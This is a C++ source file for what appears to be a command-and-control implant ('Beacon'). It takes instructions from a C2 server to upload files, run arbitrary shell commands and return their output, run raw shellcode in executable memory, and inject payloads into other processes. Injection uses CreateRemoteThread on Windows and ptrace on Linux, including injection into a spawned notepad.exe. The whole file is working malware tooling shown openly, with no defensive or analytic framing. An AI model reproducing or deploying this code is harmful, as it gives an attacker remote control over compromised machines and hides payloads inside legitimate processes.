#include "Beacon.hpp"


#ifdef __linux__ 
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#elif _WIN32
// windows code goes here
#endif

#define BUFSIZE 4096 

using namespace std;


void execAsembly(const std::string& payload)
{

#ifdef __linux__ 

	void* exec = mmap(NULL, payload.size(), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	memcpy(exec, payload.data(), payload.size());
	((int (*)()) exec)();

#elif _WIN32

	std::cout << "exec-assembly size payload " << payload.size() << std::endl;

	HANDLE g_hChildStd_IN_Rd = NULL;
	HANDLE g_hChildStd_IN_Wr = NULL;
	HANDLE g_hChildStd_OUT_Rd = NULL;
	HANDLE g_hChildStd_OUT_Wr = NULL;

	SECURITY_ATTRIBUTES saAttr;
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0);
	SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0);
	CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0);
	SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0);

	TCHAR szCmdline[] = TEXT("notepad.exe");
	PROCESS_INFORMATION piProcInfo;
	STARTUPINFO siStartInfo;
	BOOL bSuccess = FALSE;

	ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
	siStartInfo.cb = sizeof(STARTUPINFO);
	siStartInfo.hStdError = g_hChildStd_OUT_Wr;
	siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
	siStartInfo.hStdInput = g_hChildStd_IN_Rd;
	siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

	bSuccess = CreateProcess(NULL,
		szCmdline,     // command line 
		NULL,          // process security attributes 
		NULL,          // primary thread security attributes 
		TRUE,          // handles are inherited 
		0,             // creation flags 
		NULL,          // use parent's environment 
		NULL,          // use parent's current directory 
		&siStartInfo,  // STARTUPINFO pointer 
		&piProcInfo);  // receives PROCESS_INFORMATION 

	std::cout << "Injection " << piProcInfo.dwProcessId << std::endl;

	int pid = piProcInfo.dwProcessId;

	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;

	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
	remoteBuffer = VirtualAllocEx(processHandle, NULL, payload.size(), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer, payload.data(), payload.size(), NULL);
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(processHandle);

	if (!bSuccess)
		std::cout << "CreateProcess" << std::endl;
	else
	{
		CloseHandle(piProcInfo.hProcess);
		CloseHandle(piProcInfo.hThread);
		CloseHandle(g_hChildStd_OUT_Wr);
		CloseHandle(g_hChildStd_IN_Rd);
	}

	std::cout << "\n->Contents of child process STDOUT:\n\n" << std::endl;

	DWORD dwRead, dwWritten;
	CHAR chBuf[BUFSIZE];
	bSuccess = FALSE;
	HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
	HANDLE hParentStdIn = GetStdHandle(STD_INPUT_HANDLE);

	while (1)
	{
		bSuccess = ReadFile(g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, NULL);
		if (!bSuccess || dwRead == 0) break;

		bSuccess = WriteFile(hParentStdOut, chBuf, dwRead, &dwWritten, NULL);
		if (!bSuccess) break;

		// how to get interactive ???
		//bSuccess = ReadFile(hParentStdIn, chBuf, BUFSIZE, &dwRead, NULL);
		//if (!bSuccess || dwRead == 0) break;

		//bSuccess = WriteFile(g_hChildStd_IN_Rd, chBuf, BUFSIZE, &dwRead, NULL);
		//if (!bSuccess || dwRead == 0) break;
	}

#endif

	return;
}


int inject(int pid, const std::string& payload)
{

#ifdef __linux__ 

	pid_t target = pid;

	if ((ptrace(PTRACE_ATTACH, target, NULL, NULL)) < 0)
	{
		perror("ptrace(PTRACE_ATTACH)");
		return -1;
	}

	printf("Wait for process...\n");
	wait(NULL);


	struct user_regs_struct regs;
	if ((ptrace(PTRACE_GETREGS, target, NULL, &regs)) < 0)
	{
		perror("ptrace(PTRACE_GETREGS)");
		return -1;
	}

	printf("Code injection...\n");

	uint32_t* s = (uint32_t*)payload.data();
	uint32_t* d = (uint32_t*)regs.rip;

	for (int i = 0; i < payload.size(); i += 4, s++, d++)
	{
		if ((ptrace(PTRACE_POKETEXT, pid, d, *s)) < 0)
		{
			perror("ptrace(PTRACE_POKETEXT)");
			return -1;
		}
	}

	regs.rip += 2;

#elif _WIN32

	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;

	std::cout << "Injection " << pid << std::endl;

	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
	remoteBuffer = VirtualAllocEx(processHandle, NULL, payload.size(), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer, payload.data(), payload.size(), NULL);
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(processHandle);

#endif

	return 0;
}


std::string execBash(const string& cmd)
{
	std::string result;

#ifdef __linux__ 

	std::array<char, 128> buffer;

	std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd.c_str(), "r"), pclose);
	if (!pipe)
	{
		throw std::runtime_error("popen() filed!");
	}
	while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr)
	{
		result += buffer.data();
	}

#elif _WIN32

	std::array<char, 128> buffer;

	std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd.c_str(), "r"), _pclose);
	if (!pipe)
	{
		throw std::runtime_error("popen() filed!");
	}
	while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr)
	{
		result += buffer.data();
	}

#endif


	return result;
}


Beacon::Beacon()
{

}


Beacon::~Beacon()
{

}


bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
{
	string instruction = c2Message.instruction();

	if (instruction == "upload")
	{
		std::string outputFile = c2Message.outputfile();

		const std::string buffer = c2Message.data();

		std::ofstream output(outputFile, std::ios::binary);
		output << buffer;
		output.close();
	}
	else if (instruction == "exec-assembly")
	{
		const std::string buffer = c2Message.data();

		execAsembly(buffer);
	}
	else if (instruction == "script")
	{
		const std::string buffer = c2Message.data();

		std::string totalOutCmd = execBash(buffer);

		c2RetMessage.set_instruction(instruction);
		c2RetMessage.set_returnvalue(totalOutCmd);
	}
	else if (instruction == "inject")
	{
		const std::string buffer = c2Message.data();
		int pid = c2Message.pidinjection();

		std::unique_ptr<std::thread> threadExec(new std::thread(inject, pid, buffer));
		m_threadsExec.push_back(std::move(threadExec));

		//			std::thread(inject, pid, buffer);
		//			inject(pid, buffer);
	}
	else if (instruction == "run")
	{
		string shellCmd = c2Message.shellcmd();
		std::string outCmd = execBash(shellCmd);

		c2RetMessage.set_instruction(instruction);
		c2RetMessage.set_shellcmd(shellCmd);
		c2RetMessage.set_returnvalue(outCmd);
	}
	else if (instruction == "end")
		return true;

	return false;
}



